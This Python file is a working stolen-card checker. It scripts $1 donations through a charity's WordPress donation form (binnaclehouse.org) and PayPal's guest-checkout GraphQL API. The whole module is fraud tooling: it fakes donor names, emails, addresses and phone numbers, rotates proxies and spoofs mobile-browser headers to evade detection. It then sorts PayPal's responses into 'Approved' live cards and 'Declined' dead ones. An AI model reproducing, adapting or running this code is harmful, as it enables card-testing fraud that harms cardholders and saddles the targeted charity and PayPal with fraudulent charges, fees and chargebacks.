import httpx
import random
import string
import time
import json
import re
import os
import logging

logger = logging.getLogger("binnaclehouse")

SITE_URL = "https://binnaclehouse.org"
DONATE_PATH = "/donation/"
AJAX_URL = f"{SITE_URL}/wp-admin/admin-ajax.php"
PAYPAL_GQL = "https://www.paypal.com/graphql"

PROXY_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "proxy.txt")

UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"


def _get_global_proxy():
    try:
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, "r") as f:
                lines = [l.strip() for l in f if l.strip()]
            if lines:
                raw = random.choice(lines)
                parts = raw.split(":")
                if len(parts) == 4:
                    host, port, user, pwd = parts
                    return f"http://{user}:{pwd}@{host}:{port}"
                elif len(parts) == 2:
                    return f"http://{parts[0]}:{parts[1]}"
    except Exception:
        pass
    return None

LIVE_DECLINE_CODES = [
    "INSUFFICIENT_FUNDS", "CVV2_FAILURE", "INVALID SECURITY CODE",
]

DEAD_CODES = [
    "DO_NOT_HONOR", "ACCOUNT_CLOSED", "PAYER_ACCOUNT_LOCKED_OR_CLOSED",
    "LOST_OR_STOLEN", "SUSPECTED_FRAUD", "INVALID_ACCOUNT",
    "REATTEMPT_NOT_PERMITTED", "ACCOUNT_BLOCKED_BY_ISSUER",
    "ORDER_NOT_APPROVED", "INVALID_BILLING_ADDRESS",
    "EXISTING_ACCOUNT_RESTRICTED", "INVALID_SECURITY_CODE",
    "OAS_VALIDATION_ERROR", "OAS_GENERIC_ERROR",
]

GQL_MUTATION = """
        mutation payWithCard(
            $token: String!
            $card: CardInput
            $paymentToken: String
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
            $feeReferenceId: String
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                paymentToken: $paymentToken
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
                feeReferenceId: $feeReferenceId
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status
                        method
                        redirectUrl {
                            href
                        }
                        parameter
                    }
                }
            }
        }
"""


def _rand(k=10):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))


def _fake_name():
    firsts = ["James", "Robert", "John", "Michael", "David", "William", "Richard",
              "Joseph", "Thomas", "Christopher", "Daniel", "Matthew", "Andrew", "Joshua"]
    lasts = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
             "Davis", "Rodriguez", "Martinez", "Wilson", "Anderson", "Taylor", "Thomas"]
    return random.choice(firsts), random.choice(lasts)


def _fake_email():
    return f"user{random.randint(1000, 9000)}@gmail.com"


def _detect_card_type(cc):
    if cc.startswith("4"):
        return "VISA"
    elif cc[:2] in ("51", "52", "53", "54", "55") or 2221 <= int(cc[:4]) <= 2720:
        return "MASTERCARD"
    elif cc[:2] in ("34", "37"):
        return "AMEX"
    elif cc[:4] in ("6011", "6221", "6229") or cc[:2] == "65":
        return "DISCOVER"
    return "VISA"


def _build_form_data(prefix, formid, hash_val, first, last, email):
    return {
        "give-honeypot": "",
        "give-form-id-prefix": prefix,
        "give-form-id": formid,
        "give-form-title": "General Donations",
        "give-current-url": f"{SITE_URL}{DONATE_PATH}",
        "give-form-url": f"{SITE_URL}{DONATE_PATH}",
        "give-form-minimum": "1.00",
        "give-form-maximum": "999999.99",
        "give-form-hash": hash_val,
        "give-price-id": "custom",
        "give-recurring-logged-in-only": "",
        "give-logged-in-only": "1",
        "_give_is_donation_recurring": "0",
        "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
        "give-amount": "1.00",
        "give-recurring-period-donors-choice": "month",
        "give-selected-fund": "1",
        "give_tributes_type": "In honor of",
        "give_tributes_show_dedication": "no",
        "give_tributes_radio_type": "In honor of",
        "give_tributes_first_name": "",
        "give_tributes_last_name": "",
        "give_tributes_would_to": "none",
        "give_tributes_ecard_notify[recipient][personalized][]": "",
        "give_tributes_ecard_notify[recipient][first_name][]": "",
        "give_tributes_ecard_notify[recipient][last_name][]": "",
        "give_tributes_ecard_notify[recipient][email][]": "",
        "give_tributes_mail_card_notify_first_name": "",
        "give_tributes_mail_card_notify_last_name": "",
        "give_tributes_address_country": "US",
        "give_tributes_mail_card_address_1": "",
        "give_tributes_mail_card_address_2": "",
        "give_tributes_mail_card_city": "",
        "give_tributes_address_state": "NY",
        "give_tributes_mail_card_zipcode": "",
        "payment-mode": "paypal-commerce",
        "give_title": "Mr.",
        "give_first": first,
        "give_last": last,
        "give_email": email,
        "i_would_like_to_make_a_designated_gift_to_this_specific_charity": first,
        "this_gift_qualifies_for_a_company_match[]": "",
        "give_constant_contact_signup": "on",
        "give_action": "purchase",
        "give-gateway": "paypal-commerce",
        "action": "give_process_donation",
        "give_ajax": "true",
    }


async def binnaclehouse_check(cc, mm, yy, cvv, proxy=None):
    start = time.time()

    if len(yy) == 4:
        yy = yy[2:]
    mm = mm.zfill(2)

    first, last = _fake_name()
    email = _fake_email()
    card_type = _detect_card_type(cc)
    zip_code = str(random.randint(10001, 10199))

    site_headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": UA,
    }

    client_kwargs = {
        "timeout": httpx.Timeout(30),
        "follow_redirects": True,
        "headers": {"user-agent": UA},
    }
    if proxy:
        client_kwargs["proxy"] = proxy

    try:
        async with httpx.AsyncClient(**client_kwargs) as session:
            r1 = await session.get(SITE_URL + "/", headers=site_headers)
            if r1.status_code != 200:
                elapsed = round(time.time() - start, 2)
                return f"Error - Site unreachable ({r1.status_code}) [{elapsed}s]"

            site_headers_ref = {**site_headers, "referer": f"{SITE_URL}/"}
            site_headers_ref["sec-fetch-site"] = "same-origin"
            r2 = await session.get(SITE_URL + DONATE_PATH, headers=site_headers_ref)
            if r2.status_code != 200:
                elapsed = round(time.time() - start, 2)
                return f"Error - Donation page unavailable ({r2.status_code}) [{elapsed}s]"

            resp_text = r2.text
            prefix_m = re.search(r'name="give-form-id-prefix" value="(.*?)"', resp_text)
            formid_m = re.search(r'name="give-form-id" value="(.*?)"', resp_text)
            hash_m = re.search(r'name="give-form-hash" value="(.*?)"', resp_text)

            if not prefix_m or not formid_m or not hash_m:
                elapsed = round(time.time() - start, 2)
                return f"Error - Could not parse donation form [{elapsed}s]"

            prefix = prefix_m.group(1)
            formid = formid_m.group(1)
            hash_val = hash_m.group(1)

            form_data = _build_form_data(prefix, formid, hash_val, first, last, email)

            ajax_headers = {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": SITE_URL,
                "referer": SITE_URL + DONATE_PATH,
                "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": UA,
            }

            await session.post(AJAX_URL, headers=ajax_headers, data=form_data)
            await session.post(AJAX_URL, headers=ajax_headers, data=form_data)

            order_form = _build_form_data(prefix, formid, hash_val, first, last, email)
            order_form.pop("action", None)
            order_form.pop("give_ajax", None)
            order_form.pop("give_action", None)

            r_order = await session.post(
                AJAX_URL,
                params={"action": "give_paypal_commerce_create_order"},
                headers=ajax_headers,
                data=order_form,
            )

            try:
                order_json = r_order.json()
            except Exception:
                elapsed = round(time.time() - start, 2)
                return f"Error - Invalid order response [{elapsed}s]"

            order_id = None
            if "data" in order_json and isinstance(order_json["data"], dict):
                order_id = order_json["data"].get("id")
            if not order_id:
                elapsed = round(time.time() - start, 2)
                err_msg = str(order_json)[:80]
                return f"Error - No order ID: {err_msg} [{elapsed}s]"

        pp_proxy = proxy or _get_global_proxy()
        pp_kwargs = {
            "timeout": httpx.Timeout(30),
            "follow_redirects": True,
        }
        if pp_proxy:
            pp_kwargs["proxy"] = pp_proxy

        pp_headers = {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": "https://www.paypal.com",
            "referer": "https://www.paypal.com/",
            "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": UA,
            "x-app-name": "smart-payment-buttons",
            "paypal-client-context": order_id,
        }

        async with httpx.AsyncClient(**pp_kwargs) as pp_client:
            update_config = {
                "query": """
                    mutation UpdateClientConfig(
                        $orderID : String!,
                        $fundingSource : ButtonFundingSourceType!,
                        $integrationArtifact : IntegrationArtifactType!,
                        $userExperienceFlow : UserExperienceFlowType!,
                        $productFlow : ProductFlowType!,
                        $buttonSessionID : String
                    ) {
                        updateClientConfig(
                            token: $orderID,
                            fundingSource: $fundingSource,
                            integrationArtifact: $integrationArtifact,
                            userExperienceFlow: $userExperienceFlow,
                            productFlow: $productFlow,
                            buttonSessionID: $buttonSessionID
                        )
                    }
                """,
                "variables": {
                    "orderID": order_id,
                    "fundingSource": "card",
                    "integrationArtifact": "PAYPAL_JS_SDK",
                    "userExperienceFlow": "INLINE",
                    "productFlow": "SMART_PAYMENT_BUTTONS",
                },
            }

            await pp_client.post(
                f"{PAYPAL_GQL}?UpdateClientConfig",
                headers=pp_headers,
                json=update_config,
            )

            card_headers = {
                "content-type": "application/json",
                "origin": "https://www.paypal.com",
                "referer": "https://www.paypal.com/",
                "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "user-agent": UA,
                "paypal-client-metadata-id": order_id,
                "paypal-client-context": order_id,
                "x-app-name": "standardcardfields",
                "x-country": "US",
            }

            card_payload = {
                "query": GQL_MUTATION,
                "variables": {
                    "token": order_id,
                    "card": {
                        "cardNumber": cc,
                        "expirationDate": f"{mm}/{yy}",
                        "postalCode": zip_code,
                        "securityCode": cvv,
                    },
                    "phoneNumber": f"202{random.randint(1000000, 9999999)}",
                    "firstName": first,
                    "lastName": last,
                    "billingAddress": {
                        "givenName": first,
                        "familyName": last,
                        "line1": f"{random.randint(100, 999)} Broadway",
                        "line2": None,
                        "city": "New York",
                        "state": "NY",
                        "postalCode": zip_code,
                        "country": "US",
                    },
                    "shippingAddress": {
                        "givenName": first,
                        "familyName": last,
                        "line1": f"{random.randint(100, 999)} Main St",
                        "line2": None,
                        "city": "New York",
                        "state": "NY",
                        "postalCode": zip_code,
                        "country": "US",
                    },
                    "email": email,
                    "currencyConversionType": "PAYPAL",
                },
                "operationName": None,
            }

            r_card = await pp_client.post(
                f"{PAYPAL_GQL}?fetch_credit_form_submit",
                headers=card_headers,
                json=card_payload,
            )

            elapsed = round(time.time() - start, 2)

            try:
                result_json = r_card.json()
            except Exception:
                return f"Error - Invalid PayPal response [{elapsed}s]"

            result_text = json.dumps(result_json)
            txt_upper = result_text.upper()

            if "INSUFFICIENT_FUNDS" in txt_upper:
                return f"Approved - INSUFFICIENT_FUNDS | {cc[:6]} [{elapsed}s]"

            if "CVV2_FAILURE" in txt_upper or "INVALID SECURITY CODE" in txt_upper:
                return f"Approved - CVV_FAILURE | {cc[:6]} [{elapsed}s]"

            for code in DEAD_CODES:
                if code in txt_upper:
                    return f"Declined - {code} | {cc[:6]} [{elapsed}s]"

            if "expired_card" in result_text.lower() or "EXPIRED" in txt_upper:
                return f"Declined - Expired Card | {cc[:6]} [{elapsed}s]"

            if "card_declined" in result_text.lower() or "GENERIC_DECLINE" in txt_upper:
                return f"Declined - Card Declined | {cc[:6]} [{elapsed}s]"

            errors = result_json.get("errors", [])
            if errors:
                err0 = errors[0]
                msg = err0.get("message", "")
                err_data = err0.get("data", [])
                if isinstance(err_data, list) and err_data:
                    code = err_data[0].get("code", "")
                    if code:
                        if code in ("INSUFFICIENT_FUNDS", "CVV2_FAILURE"):
                            return f"Approved - {code} | {cc[:6]} [{elapsed}s]"
                        return f"Declined - {code} | {cc[:6]} [{elapsed}s]"
                details = err0.get("details", [])
                if isinstance(details, list) and details:
                    issue = details[0].get("issue", "")
                    if issue:
                        return f"Declined - {issue} | {cc[:6]} [{elapsed}s]"
                if msg:
                    return f"Declined - {msg[:60]} | {cc[:6]} [{elapsed}s]"
                return f"Declined - Unknown Error | {cc[:6]} [{elapsed}s]"

            data = result_json.get("data", {})
            approve = data.get("approveGuestPaymentWithCreditCard")
            if approve is not None:
                flags = approve.get("flags", {})
                if flags.get("is3DSecureRequired"):
                    return f"Approved - 3DS Required | {cc[:6]} [{elapsed}s]"
                return f"Charged $1 | {cc[:6]} [{elapsed}s]"

            return f"Declined - Unknown Response | {cc[:6]} [{elapsed}s]"

    except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
        elapsed = round(time.time() - start, 2)
        return f"Error - Timeout [{elapsed}s]"
    except httpx.NetworkError:
        elapsed = round(time.time() - start, 2)
        return f"Error - Network Error [{elapsed}s]"
    except Exception as e:
        elapsed = round(time.time() - start, 2)
        logger.warning(f"binnaclehouse error: {e}")
        return f"Error - {str(e)[:80]} [{elapsed}s]"
